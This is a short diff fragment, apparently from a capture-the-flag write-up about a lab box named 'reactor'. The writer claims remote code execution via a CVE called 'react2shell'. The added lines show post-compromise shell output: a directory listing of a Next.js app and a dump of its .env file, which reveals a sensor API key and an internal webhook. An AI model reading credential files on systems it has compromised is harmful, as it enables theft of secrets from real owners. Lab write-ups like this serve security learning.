@@ -109,3 +109,31 @@ print(res.text)
 
 form this i get rce of cve react2shell
 
+```
+node@reactor:/opt/reactor-app$ ls -la
+total 76
+drwxr-xr-x  5 node node  4096 Dec 28 21:05 .
+drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
+drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
+-rw-r--r--  1 node node   276 Dec 28 21:05 .env
+drwxr-xr-x  7 node node  4096 Dec 28 20:47 .next
+-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
+drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
+-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
+-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
+-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db
+node@reactor:/opt/reactor-app$ cat .env
+# ReactorWatch Configuration
+# Database connection for sensor data
+
+DB_PATH=/opt/reactor-app/reactor.db
+DB_TYPE=sqlite3
+
+# API Keys
+SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
+ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
+
+# Node environment
+NODE_ENV=production
+```
+
